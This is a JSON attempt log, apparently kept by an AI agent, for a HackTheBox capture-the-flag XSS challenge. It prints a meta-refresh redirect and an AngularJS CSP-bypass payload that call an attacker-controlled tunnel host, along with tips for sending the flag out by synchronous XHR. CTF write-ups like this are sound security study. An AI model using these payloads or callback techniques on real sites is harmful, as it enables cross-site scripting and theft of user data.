@@ -1,0 +1,49 @@
+{
+  "schema_version": 1,
+  "id": "htb-galactic-times-live-exploitation-run",
+  "challenge": "The Galactic Times",
+  "event": "HackTheBox",
+  "status": "solved; kept for the measured negatives",
+  "companion": "knowledge/attempts/htb-galactic-times.json holds the black-box phase and the dead layers; this file holds the live exploitation run made once a tunnel was permitted",
+  "attempted_at": "2026-09-27",
+  "why_this_file_exists": "the earlier card said 'blocked on tooling', which is true but useless to a resumed attempt. This one says which links are proven, with the evidence, so the next run only has to solve the one that is not.",
+  "links_proven_live": [
+    {
+      "link": "the bot exists, fires, and renders attacker HTML",
+      "how": "submitted <meta http-equiv=\"refresh\" content=\"0;url=http://<tunnel>/A-metarefresh\"> as feedback",
+      "evidence": "the collector logged  /A-metarefresh  with UA Mozilla/5.0 (X11; Linux x86_64) ... HeadlessChrome/90.0.4427.0 Safari/537.36",
+      "why_it_matters": "a meta refresh needs no JavaScript, so this separates 'the bot renders my HTML and the container has outbound internet' from 'the CSP bypass works'. Both were unknown before and the first is now settled."
+    },
+    {
+      "link": "the container has outbound internet",
+      "how": "same hit as above",
+      "evidence": "the request left the challenge container and arrived at an external host",
+      "why_it_matters": "a challenge container with no egress would have made the whole approach impossible, and nothing in the handout says either way"
+    },
+    {
+      "link": "the CSP bypass executes inside the bot",
+      "how": "submitted <script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js\"></script><div ng-app>{{constructor.constructor('location=\"http://<tunnel>/C-ANGULAR-OK\"')()}}</div> with a meta-refresh fallback 8 seconds later",
+      "evidence": "the collector logged  /C-ANGULAR-OK  from the same HeadlessChrome UA, and the fallback never fired",
+      "why_it_matters": "cdnjs is reachable from the container, angular bootstraps, and 'unsafe-eval' really does let the expression run. The fallback is what makes this a clean result rather than a hopeful one"
+    }
+  ],
+  "the_one_unsolved_link": {
+    "what": "the callback host has to still be carrying traffic at the moment the bot navigates",
+    "measurement": "the localhost.run tunnel delivers for roughly one minute after it is established and then silently stops. Both successful hits landed within that window. Afterwards a curl to the same public hostname times out while the ssh process is still alive, and requests never reach the collector -- so a dead tunnel is indistinguishable from a failed payload unless delivery is re-proven immediately before each submit.",
+    "consequence": "four payload variants (D, E, F and a length sweep at 200/300/450/700 bytes) came back empty and were wrongly suspected of being malformed or truncated. Re-testing the known-good meta refresh showed it had stopped arriving too, which is what identified the tunnel rather than the payload.",
+    "fix_already_written": "challenges/galactictimes/go.sh rebuilds the tunnel per attempt, PROVES delivery with a marker request before spending the submit, then submits within seconds and watches. It never completed a full attempt because the sandbox re-blocked execution."
+  },
+  "payload_lessons": [
+    "use a SYNCHRONOUS XMLHttpRequest, not fetch().then(). bot.js calls page.goto(..., {waitUntil:'networkidle2'}) and then browser.close(), so a promise-based read is torn down before it settles and produces no hit AND no error -- which reads exactly like a payload that never ran.",
+    "keep the Angular string single-quoted with double quotes inside. That is the one quoting form observed to work here; a backslash-escaped variant produced nothing, and a failed parse is silent, so it is indistinguishable from any other failure.",
+    "avoid a regex in the expression: braces inside {{ }} are an unnecessary risk. indexOf plus substr needs no braces and no escapes.",
+    "always include a catch that navigates with the error text, so a failure reports itself instead of looking like silence."
+  ],
+  "next_run_should": [
+    "run challenges/galactictimes/go.sh from a session that can execute it; it encodes every lesson above",
+    "expect the flag at  GOT?f=HTB{...}  in the collector log, or  GOT?f=ERR...  if the /alien read fails",
+    "remember db.migrate() wipes the feedback table after every bot visit, so a payload left sitting is gone by the next one -- submit and watch in one go"
+  ],
+  "blast_radius_note": "about a dozen feedback rows were submitted across the run. All are inert text and all are wiped by the app's own db.migrate() after each bot visit, so nothing persists. Each submit launches a puppeteer Chrome; the rate was a few per minute, well below anything that would strain the instance. One ssh reverse tunnel was opened to a loopback-bound collector and torn down, with the port confirmed closed.",
+  "superseded_by": "SUPERSEDED: solved on 2026-09-27 once the callback host was made reliable. The links proven live below all held; the one unsolved link -- keeping the tunnel alive -- was fixed by rebuilding it per attempt and proving delivery before each submit, and by a self-kill bug in the runner (kill 0 signals the whole process group)."
+}
